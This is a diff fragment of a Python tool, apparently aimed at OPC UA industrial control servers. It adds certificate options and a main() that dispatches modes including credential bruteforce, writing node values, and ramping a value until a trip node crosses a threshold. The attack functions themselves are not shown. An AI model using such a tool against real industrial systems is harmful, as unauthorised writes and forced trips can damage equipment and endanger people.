+    parser.add_argument("--ramp-step",      type=float, default=1)
+    parser.add_argument("--trip-nodeid",    help="NodeID for trip detection")
+    parser.add_argument("--threshold",      type=float)
+    # ── Security options (NEW) ──────────────────────────────────
+    parser.add_argument("--security",       default="none",
+        choices=["none","sign","sign-encrypt","auto"],
+        help="Security mode: none/sign/sign-encrypt/auto")
+    parser.add_argument("--cert",           help="Path to certificate.der")
+    parser.add_argument("--key",            help="Path to private-key.pem")
+
+    args = parser.parse_args()
+    if args.help or not args.url:
+        print(BANNER)
+        print(HELP_TEXT)
+        sys.exit(0)
+    return args
+
+
+async def main():
+    args = parse_args()
+
+    url      = args.url
+    user     = args.user
+    pwd      = args.password
+    cert     = args.cert
+    key      = args.key
+    security = args.security
+
+    print(f"[*] Target   : {url}")
+    print(f"[*] Mode     : {args.mode}")
+    print(f"[*] Security : {security}")
+    if cert:
+        print(f"[*] Cert     : {cert}")
+    if user:
+        print(f"[*] Auth     : {user}:{pwd}")
+    else:
+        print(f"[*] Auth     : anonymous")
+
+    if args.mode == "info":
+        await mode_info(url, cert=cert, key=key)
+
+    elif args.mode == "enum":
+        await mode_enum(url, user, pwd, args.output, args.ns, cert, key, security)
+
+    elif args.mode == "brute":
+        await mode_bruteforce(url, args.wordlist)
+
+    elif args.mode == "writable":
+        await mode_writable(url, user, pwd, cert, key, security, ns_filter=args.ns)
+
+    elif args.mode == "read":
+        if not args.nodeid:
+            print("[-] -n/--nodeid required"); sys.exit(1)
+        await mode_read(url, args.nodeid, user, pwd, cert, key, security)
+
+    elif args.mode == "write":
+        if not args.nodeid or args.value is None:
+            print("[-] -n/--nodeid and -v/--value required"); sys.exit(1)
+        await mode_write(url, args.nodeid, args.value, args.type,
+                         user, pwd, cert, key, security)
+
+    elif args.mode == "monitor":
+        nodes = args.monitor_nodes or []
+        if not nodes:
+            print("[-] --monitor-nodes required"); sys.exit(1)
+        await mode_monitor(url, nodes, args.interval, user, pwd, cert, key, security)
+
+    elif args.mode == "ramp":
+        if not args.nodeid:
+            print("[-] -n/--nodeid required"); sys.exit(1)
+        await mode_ramp(url, args.nodeid,
+                        args.ramp_start, args.ramp_end, args.ramp_step,
+                        args.interval, args.trip_nodeid, args.threshold,
+                        user, pwd, cert, key, security)
+
+
+if __name__ == "__main__":
+    asyncio.run(main())
